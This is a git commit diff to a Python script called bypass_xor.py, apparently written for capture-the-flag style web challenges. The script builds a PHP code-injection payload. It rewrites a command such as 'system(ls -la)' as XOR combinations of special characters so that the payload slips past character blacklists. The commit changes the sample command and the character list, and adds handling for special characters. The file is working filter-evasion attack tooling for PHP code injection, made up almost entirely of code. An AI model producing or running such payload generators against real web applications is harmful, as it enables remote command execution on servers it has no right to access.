918d87c64deee5becca74c548ce932cce67f290c
FermaLeRetour <114008563+FermaLeRetour@users.noreply.github.com>
2024-02-29 00:34:44 +0100

    Removed "`"from special characters

--- bypass_xor.py
+++ bypass_xor.py
@@ -1,6 +1,6 @@
-caracteres_speciaux = ["!", "#", "$", "%", "&", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";","<", "=", ">", "?", "@", "[", "]", "^", "_", "`", "{", "|", "}", "~"]
+caracteres_speciaux = ["!", "#", "$", "%", "&", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";","<", "=", ">", "?", "@", "[", "]", "^", "_", "{", "|", "}", "~"]
 
-commande='system(ls)'
+commande='system(ls -la)'
 commande_xor='$_++;'
 count=0
 for letter in commande:
@@ -9,6 +9,9 @@ for letter in commande:
         count=3
     elif letter==')':
         commande_xor+=');'
+    elif letter in caracteres_speciaux:
+        commande_xor+='.\"{}\"'.format(letter)
+        
     else:
         if count==0:
             commande_xor+='$__='
@@ -21,8 +24,6 @@ for letter in commande:
             for j in caracteres_speciaux:
                 chara=chr(ord(i)^ord(j))
                 if letter==chara:
-                    #print(f"{chara} : {i} {j}")
-                    #print(f"(\"{i}\"^\"{j}\")")
                     commande_xor+="(\"{}\"^\"{}\")".format(i,j)
                     
                     found=True
